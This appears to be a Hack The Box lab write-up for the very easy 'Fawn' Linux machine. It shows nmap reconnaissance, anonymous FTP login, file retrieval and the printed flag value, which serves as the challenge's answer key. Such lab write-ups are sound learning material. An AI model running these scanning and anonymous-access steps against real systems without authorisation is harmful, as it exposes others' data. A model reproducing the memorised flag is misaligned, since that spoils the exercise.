Fawn

Very Easy
🐧 Linux 🎯 Hack The Box 📌 Resume Evidence

Fawn is a very easy Linux machine which explores the File Transfer Protocol (FTP) and its exploitation when misconfigured to allow anonymous access.

On this page
1. Reconnaissance 2. Initial Access/Retrieval 3. Flag Extraction 4. Key Learnings
1 Reconnaissance

Began with a script default (-sC) and service detection (-sV) scan to map the attack surface, followed by a targeted scan.

terminal — nmap
# Script Default and Service Detection port scan
$ nmap -sC -sV -oN fawn.txt 10.129.148.135

PORT    STATE SERVICE
21/tcp open  vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.14.165
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
Service Info: OS: Unix
Service detection performed. Please report any incorrect results at 
https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 70.03 seconds

Port 21 confired that the target was running an FTP service with annonymous access exposed, indicating that FTP enumeration would be the primary focus for further investigation

💡
Why this matters: File Transfer Protocol (FTP) is a long-standing, standardized method for transfering files between system over a network. It operates on a client-server model using TCP ports 20 (data) and 21 (control), enabling structured, reliable file exchange.
2 Initial Access

I connected to the FTP service using the target's IP address. Since the FTP server allowed login, I used to the default anonymous account to access the files. After successfully logging in.

terminal — ftp
# File Transfer Protocol connected
$ ftp 10.129.148.135
# the default login anonymous
$ ftp 10.129.148.135
Connected to 10.129.148.135.
220 (vsFTPd 3.0.3)
Name (10.129.148.135:edlry): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.


# Connected to the ftp server
ftp> dir
229 Entering Extended Passive Mode (|||29126|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
226 Directory send OK.

after executing thedir command, the contents of the FTP server were listed. Among the available files, a file named flag.txt was identified

terminal — file retrieval
# retrieve file
$ get flag.txt
local: flag.txt remote: flag.txt
229 Entering Extended Passive Mode (|||16948|)
150 Opening BINARY mode data connection for flag.txt (32 bytes).
100% |********************************************|    32       34.11 KiB/s    00:00 ETA
226 Transfer complete.

The get command was then used to transfer flag.txt from the FTP server to the local machine. After file was successfully downloaded it was examined to obtain the flag required for the challenge.

3 Flag Extraction

The flag was extracted by displaying the contents of flag.txt using the cat command.

terminal — flag
# Display the content of flag.txt
$ cat flag.txt
035db21c881520061c53e0536e44f815
4 Key Learnings
  • Understood that FTP commonly runs on port 21
  • Learned what FTP (File Transfer Protocol) is used for
  • Discovered that FTP server may allow anonymous login
  • Used commands like dir to list files
  • Learned how misconfigured services can lead to data exposure
